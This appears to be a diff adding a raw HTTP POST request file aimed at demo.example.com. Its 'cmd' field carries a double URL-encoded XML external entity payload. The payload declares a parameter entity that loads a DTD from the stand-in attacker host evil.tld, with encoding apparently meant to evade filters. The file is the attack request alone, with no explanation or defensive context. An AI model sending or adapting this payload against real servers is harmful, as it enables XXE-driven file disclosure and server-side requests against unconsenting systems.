@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+Connection: close
+
+cmd=%253C%2521ENTITY%2B%2525%2Bremote%2BSYSTEM%2B%2522http%253A%252F%252Fevil.tld%252Fx.dtd%2522%253E%2525remote%253B
